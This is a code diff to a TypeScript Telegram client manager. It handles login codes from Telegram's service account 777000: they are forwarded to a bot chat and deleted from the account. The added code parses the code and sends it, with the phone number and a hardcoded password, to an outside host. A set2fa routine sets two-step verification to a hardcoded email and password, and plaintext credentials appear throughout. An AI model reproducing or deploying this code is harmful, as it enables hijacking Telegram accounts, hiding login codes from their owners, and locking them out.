@@ -20,6 +20,7 @@ class TelegramManager {
     private client: TelegramClient | null;
     private channelArray: string[];
     private activeChannelsService: ActiveChannelsService;
+    private static activeClientSetup: { mobile: string, clientId: string };
 
     constructor(sessionString: string, phoneNumber: string) {
         console.log(sessionString);
@@ -28,6 +29,15 @@ class TelegramManager {
         this.phoneNumber = phoneNumber;
         this.client = null;
         this.channelArray = [];
+    }
+
+
+    public static getActiveClientSetup() {
+        return TelegramManager.activeClientSetup;
+    }
+
+    public static setActiveClientSetup(data: { mobile: string, clientId: string }) {
+        TelegramManager.activeClientSetup = data;
     }
 
     async disconnect(): Promise<void> {
@@ -42,6 +52,11 @@ class TelegramManager {
         if (!this.client) throw new Error('Client is not initialized');
         const entity = await this.client.getInputEntity(username);
         return entity;
+    }
+
+    async getMe() {
+        const me = <Api.User>await this.client.getMe();
+        return me
     }
 
     async createClient(handler = true): Promise<TelegramClient> {
@@ -239,19 +254,32 @@ class TelegramManager {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
                 console.log(event.message.text.toLowerCase());
-                const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
-                const payload = {
-                    "chat_id": "-1001801844217",
-                    "text": event.message.text
-                };
-                axios.post(ppplbot, payload)
-                    .then((response) => {
-                    })
-                    .catch((error) => {
-                        console.log(parseError(error))
-                        console.log(parseError(error))
-                    });
-                await event.message.delete({ revoke: true });
+                console.log("Login Code received for - ", this.phoneNumber, '\nSetup - ', TelegramManager.activeClientSetup);
+                if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.mobile) {
+                    console.log("LoginText: ", event.message.text)
+                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
+                    console.log("Code is:", code);
+                    try {
+                        const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
+                        console.log("Code Sent back");
+                    } catch (error) {
+                        console.log(error)
+                    }
+                } else {
+                    const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
+                    const payload = {
+                        "chat_id": "-1001801844217",
+                        "text": event.message.text
+                    };
+                    axios.post(ppplbot, payload)
+                        .then((response) => {
+                        })
+                        .catch((error) => {
+                            console.log(parseError(error))
+                            console.log(parseError(error))
+                        });
+                    await event.message.delete({ revoke: true });
+                }
             }
         }
     }
@@ -452,56 +480,69 @@ class TelegramManager {
             throw error
         }
     }
+    async hasPassword() {
+        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
+        return passwordInfo.hasPassword
+    }
 
     async set2fa() {
-        const imapService = MailReader.getInstance();
-        try {
-            imapService.connectToMail();
-            const intervalParentId = setInterval(async () => {
-                const isReady = imapService.isMailReady();
-                if (isReady) {
-                    clearInterval(intervalParentId);
-                    await this.client.updateTwoFaSettings({
-                        isCheckPassword: false,
-                        email: "storeslaksmi@gmail.com",
-                        hint: "password - India143",
-                        newPassword: "Ajtdmwajt1@",
-                        emailCodeCallback: async (length) => {
-                            console.log("code sent");
-                            return new Promise(async (resolve) => {
-                                let retry = 0
-                                const intervalId = setInterval(async () => {
-                                    console.log("checking code");
-                                    retry++
-                                    const isReady = imapService.isMailReady();
-                                    if (isReady && retry < 4) {
-                                        const code = await imapService.getCode();
-                                        console.log('Code: ', code)
-                                        if (code) {
-                                            clearInterval(intervalId);
-                                            imapService.disconnectFromMail()
-                                            resolve(code);
-                                        } else {
+        if (!(await this.hasPassword())) {
+            const imapService = MailReader.getInstance();
+            const twoFaDetails = {
+                email: "storeslaksmi@gmail.com",
+                hint: "password - India143",
+                newPassword: "Ajtdmwajt1@",
+            }
+            try {
+                imapService.connectToMail();
+                const intervalParentId = setInterval(async () => {
+                    const isReady = imapService.isMailReady();
+                    if (isReady) {
+                        clearInterval(intervalParentId);
+                        await this.client.updateTwoFaSettings({
+                            isCheckPassword: false,
+                            email: twoFaDetails.email,
+                            hint: twoFaDetails.hint,
+                            newPassword: twoFaDetails.newPassword,
+                            emailCodeCallback: async (length) => {
+                                console.log("code sent");
+                                return new Promise(async (resolve) => {
+                                    let retry = 0
+                                    const intervalId = setInterval(async () => {
+                                        console.log("checking code");
+                                        retry++
+                                        const isReady = imapService.isMailReady();
+                                        if (isReady && retry < 4) {
+                                            const code = await imapService.getCode();
                                             console.log('Code: ', code)
+                                            if (code) {
+                                                clearInterval(intervalId);
+                                                imapService.disconnectFromMail()
+                                                resolve(code);
+                                            } else {
+                                                console.log('Code: ', code)
+                                            }
+                                        } else {
+                                            clearInterval(intervalId);
+                                            await this.client.disconnect();
+                                            imapService.disconnectFromMail()
+                                            resolve(undefined);
                                         }
-                                    } else {
-                                        clearInterval(intervalId);
-                                        await this.client.disconnect();
-                                        imapService.disconnectFromMail()
-                                        resolve(undefined);
-                                    }
-                                }, 10000);
-                            });
-                        },
-                        onEmailCodeError: (e) => { console.log(parseError(e)); return Promise.resolve("error") }
-                    })
-                }
-            }, 5000);
-        } catch (e) {
-            console.log(e)
-            parseError(e)
+                                    }, 10000);
+                                });
+                            },
+                            onEmailCodeError: (e) => { console.log(parseError(e)); return Promise.resolve("error") }
+                        })
+                        return twoFaDetails
+                    }
+                }, 5000);
+            } catch (e) {
+                console.log(e)
+                parseError(e)
+            }
         }
     }
+
     async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {
         if (!this.client) throw new Error('Client is not initialized');
         const filePath = await this.getFileUrl(url, filename);
